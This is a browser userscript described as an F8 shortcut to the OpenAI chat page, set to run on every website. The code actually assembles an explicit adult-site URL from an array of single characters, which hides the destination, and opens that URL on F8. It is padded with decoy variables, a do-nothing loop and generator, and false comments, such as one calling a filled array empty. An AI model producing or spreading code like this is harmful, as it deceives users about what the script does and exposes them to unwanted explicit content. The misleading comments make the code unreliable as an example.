// ==UserScript==
// @license MIT
// @name         Chat OpenAI shortcut
// @namespace    http://tampermonkey.net/
// @version      1
// @description  Press F8 to open chat page in a new tab.
// @match        https://*/*
// @match        http://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/465383/Chat%20OpenAI%20shortcut.user.js
// @updateURL https://update.greasyfork.org/scripts/465383/Chat%20OpenAI%20shortcut.meta.js
// ==/UserScript==

(function() {
    'use strict';
// This is a comment, it will not affect the code in any way

var x = "ChatBotgpt"; // This line declares a variable called "x" and assigns it the value of 5
// This is a comment, it will not affect the code in any way
var myArray = ["service","serviceactive"]; // This line creates an empty array
var y = "Chatbot"; // This line declares a variable called "x" and assigns it the value of 5
var myArray2 = ["doneload"]; // This line creates an empty array
    // This is a comment, it will not affect the code in any way
var n = ["h", "t", "t", "p", "s", ":", "/", "/", "w", "w", "w", ".", "r", "a", "t", "e", "m", "y", "c", "o", "c", "k", ".", "c", "o", "m"]
var myString = "This string does nothing!"; // This line declares a string variable with a value

for (var i = 0; i < 10; i++) {
  // This loop does nothing

}
function* generator(i) {
  yield i;
  yield i + 10;
}

const gen = generator(10);
var newUrl = n.join("");
console.log(gen.next().value);
// Expected output: 10

console.log(gen.next().value);
// Expected output: 20

    document.addEventListener('keydown', function(event) {
        if (event.key === 'F8') {
            window.open((newUrl), '_blank');
        }
    });
})();
